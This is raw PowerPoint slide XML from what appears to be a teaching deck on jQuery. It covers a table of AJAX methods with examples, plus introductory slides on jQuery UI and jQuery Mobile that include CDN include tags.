                        <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
                        <a:t>ajax</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>({'</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
                        <a:t>url':'test.php</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>'})</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45717" marB="45717"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10001"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="414141">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>.</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
                        <a:t>ajaxSetup</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>(</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:hlinkClick r:id="rId3"/>
                        </a:rPr>
                        <a:t>settings</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45717" marB="45717"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>sets default values for future AJAX</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45717" marB="45717"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>$.</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
                        <a:t>ajaxSetup</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>({'timeout': 2000})</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45717" marB="45717"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10002"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="640137">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>.get(</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
                        <a:t>url</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>, data, success)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45717" marB="45717"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>loads data from </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" i="1" dirty="0" err="1"/>
                        <a:t>url</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t> using GET, data is sent with request</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45717" marB="45717"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>$.get('q.php',</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" baseline="0" dirty="0"/>
                        <a:t> null, done)</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45717" marB="45717"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10003"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="640137">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>.</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
                        <a:t>getIfModified</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>(</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
                        <a:t>url</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>,</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" baseline="0" dirty="0"/>
                        <a:t> data, success)</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45717" marB="45717"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>gets data if it has been changed over last request</a:t>
                      </a:r>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t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
                        <a:t>getIfModified</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>('q.php',</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" baseline="0" dirty="0"/>
                        <a:t> null, done)</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45717" marB="45717"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10004"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="640137">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>.load(</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
                        <a:t>url</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>, data, success)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45717" marB="45717"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>loads</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" baseline="0" dirty="0"/>
                        <a:t> data from server  and places the returned html</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>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$('#e1').load('q.php',</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" baseline="0" dirty="0"/>
                        <a:t> null, done)</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45717" marB="45717"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10005"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="365786">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>.post(</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
                        <a:t>url</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>,</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" baseline="0" dirty="0"/>
                        <a:t> data, success)</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45717" marB="45717"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>loads data from the server using </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" baseline="0" dirty="0"/>
                        <a:t> POST</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>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$.post('q.php',</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" baseline="0" dirty="0"/>
                        <a:t> null, done)</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45717" marB="45717"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10006"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="392117">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>.</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
                        <a:t>getJSON</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>(</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
                        <a:t>url</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>, data, success)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45717" marB="45717"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>get JSON data via AJAX</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45717" marB="45717"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>$.</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
                        <a:t>getJSON</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>('j.php',</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" baseline="0" dirty="0"/>
                        <a:t> null, done)</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45717" marB="45717"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10007"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="640134">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>.</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
                        <a:t>getScript</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>(</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
                        <a:t>url</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>, success)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45717" marB="45717"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>loads JavaScript from server and executes</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" baseline="0" dirty="0"/>
                        <a:t> it</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45717" marB="45717"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>.</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
                        <a:t>getScript</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>('s.php')</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45717" marB="45717"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10008"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370820">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>.serialize()</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45717" marB="45717"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>returns string containing form</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45717" marB="45717"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>$('#form').serialize()</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45717" marB="45717"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10009"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>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itle 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CA32E3CC-0A8F-4703-9CCA-EF848D74BAC0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>jQuery UI</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="196611" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{02E70B07-CF30-4C54-81BC-F10F2F591A79}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="407988" y="1600200"/>
            <a:ext cx="11520487" cy="4853136"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" b="1" dirty="0">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>jQuery UI</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0"/>
              <a:t> is a collection of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0">
                <a:hlinkClick r:id="rId3" tooltip="GUI widget"/>
              </a:rPr>
              <a:t>GUI widgets</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0"/>
              <a:t>, animated visual effects, and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0">
                <a:hlinkClick r:id="rId4" tooltip="Theme (computing)"/>
              </a:rPr>
              <a:t>themes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0"/>
              <a:t> implemented with </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0">
                <a:hlinkClick r:id="rId5" tooltip="JQuery"/>
              </a:rPr>
              <a:t>jQuery</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0"/>
              <a:t> (a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0">
                <a:hlinkClick r:id="rId6" tooltip="JavaScript"/>
              </a:rPr>
              <a:t>JavaScript</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0">
                <a:hlinkClick r:id="rId7" tooltip="Library (computing)"/>
              </a:rPr>
              <a:t>library</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0"/>
              <a:t>), </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0">
                <a:hlinkClick r:id="rId8" tooltip="Cascading Style Sheets"/>
              </a:rPr>
              <a:t>Cascading Style Sheets</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0"/>
              <a:t>, and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0">
                <a:hlinkClick r:id="rId9" tooltip="HTML"/>
              </a:rPr>
              <a:t>HTML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" baseline="30000" dirty="0">
                <a:hlinkClick r:id="rId10"/>
              </a:rPr>
              <a:t>[4]</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0"/>
              <a:t> According to JavaScript analytics service, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0" err="1">
                <a:hlinkClick r:id="rId11" tooltip="Libscore"/>
              </a:rPr>
              <a:t>Libscore</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0"/>
              <a:t>, jQuery UI is used on over 197,000 of the top one million websites, making it the second most popular JavaScript library.</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0"/>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script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src</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"https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt;&lt;/script&gt;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link</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rel</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stylesheet</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href</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"https://ajax.googleapis.com/ajax/libs/jqueryui/1.12.1/themes/smoothness/jquery-ui.css"</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script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src</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"https://ajax.googleapis.com/ajax/libs/jqueryui/1.12.1/jquery-ui.min.js"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt;&lt;/script&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" sz="2000" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>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itle 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E18EC7CB-E025-493A-968F-96BB812EDAF2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>jQuery Mobile</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="fi-FI"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="198659" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{12C89796-B11D-494D-8723-CDFB841F40B8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="334963" y="1600200"/>
            <a:ext cx="11522075" cy="4525963"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0"/>
              <a:t>jQuery Mobile is a HTML5-based user interface system designed to make responsive web sites and apps that are accessible on all smartphone, tablet and desktop devices.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0"/>
              <a:t>Supports all popular mobile browsers + desktop browsers</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0"/>
              <a:t>Makes the form widgets larger and easier to use than defaults</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0" err="1">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>ThemeRoller</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0"/>
              <a:t> allows easy customization of themes</a:t>
            </a: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script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src</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"https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt;&lt;/script&gt;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link</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rel</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stylesheet</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href</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"https://ajax.googleapis.com/ajax/libs/jquerymobile/1.4.5/jquery.mobile.min.css"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" sz="2000" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>script</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"https://ajax.googleapis.com/ajax/libs/jquerymobile/1.4.5/jquery.mobile.min.js"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt;&lt;/script&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" sz="2000" b="0" dirty="0">
              <a:solidFill>
